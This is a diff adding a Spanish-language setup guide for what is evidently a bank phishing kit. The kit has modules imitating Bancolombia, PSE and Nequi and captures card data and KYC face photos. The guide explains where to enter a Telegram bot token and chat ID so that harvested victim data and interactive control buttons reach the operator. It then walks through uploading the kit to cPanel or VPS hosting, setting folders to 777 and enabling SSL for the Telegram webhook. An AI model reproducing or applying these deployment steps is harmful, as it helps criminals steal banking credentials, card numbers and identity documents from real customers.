@@ -1,0 +1,73 @@
+====================================================================
+  GUIA FACIL: CONFIGURACION DE CREDENCIALES Y SUBIDA A HOSTING
+====================================================================
+
+1. DONDE CAMBIAR LAS CREDENCIALES PRINCIPALES
+--------------------------------------------------------------------
+Para cambiar el Bot Token y el Chat ID donde llegan los datos y 
+los botones interactivos de Telegram, SOLO debes editar UN archivo:
+
+   Archivo: /config.php  (En la carpeta raiz del proyecto)
+
+Contenido exacto del archivo:
+--------------------------------------------------------------------
+<?php
+return [
+    'bot_token' => 'TU_BOT_TOKEN_AQUI',
+    'chat_id'   => 'TU_CHAT_ID_AQUI'
+];
+--------------------------------------------------------------------
+
+* NOTA IMPORTANTE: Todos los modulos del proyecto (Bancolombia, PSE, 
+Tarjetas / data-cc, Caras / KYC, Nequi, etc.) estan vinculados a este 
+archivo central. Al cambiarlo aqui, se actualiza todo automaticamente 
+en un solo paso.
+
+
+====================================================================
+2. PASO A PASO PARA SUBIR TU PROYECTO A UN HOSTING (cPanel / DirectAdmin / VPS)
+====================================================================
+
+PASO 1: PREPARAR EL ARCHIVO ZIP
+- En tu computadora, selecciona todos los archivos y carpetas del 
+  proyecto y comprimelos en un archivo .zip (ejemplo: proyecto.zip).
+
+PASO 2: SUBIR AL SERVIDOR
+- Entra al cPanel de tu hosting -> "Administrador de Archivos" (File Manager).
+- Ve a la carpeta donde ira tu pagina (normalmente public_html o una subcarpeta).
+- Haz clic en "Cargar" (Upload) y sube el archivo .zip.
+
+PASO 3: EXTRAER LOS ARCHIVOS
+- Haz clic derecho sobre el .zip en el cPanel y selecciona "Extract" (Descomprimir).
+- Verifica que el archivo index.php y config.php queden en la raiz de tu dominio o carpeta.
+- Ya puedes borrar el archivo .zip para no ocupar espacio.
+
+PASO 4: CONFIGURAR TUS CREDENCIALES EN EL HOSTING
+- Abre el archivo config.php directamente desde el editor de cPanel.
+- Coloca tu bot_token y tu chat_id. Guarda los cambios.
+
+PASO 5: ASIGNAR PERMISOS DE ESCRITURA (CHMOD 777 o 775)
+Para que el sistema pueda recibir los clics de los botones de Telegram
+y guardar los estados temporales sin errores, asegurate de que las 
+siguientes carpetas tengan permisos de escritura (777 o 775):
+- datac/
+- data-ps/recargas/transaction/
+- data-ps/recargas/transaction/b-34f9/telegram_actions/
+
+PASO 6: CERTIFICADO SSL (HTTPS OBLIGATORIO)
+- Telegram REQUIERE obligatoriamente que tu dominio cuente con HTTPS / SSL 
+  activo para responder a los botones y callbacks del webhook.
+- Activa el certificado SSL gratuito (Let's Encrypt / AutoSSL) desde tu cPanel.
+
+
+====================================================================
+3. REQUISITOS DEL SERVIDOR / HOSTING
+====================================================================
+- Version de PHP recomendada: PHP 7.4, 8.0, 8.1 o 8.2
+- Extensiones PHP requeridas (vienen activas por defecto en todo hosting):
+  * cURL
+  * JSON
+  * OpenSSL / SSL
+- Soporte HTTPS / SSL activo.
+
+====================================================================
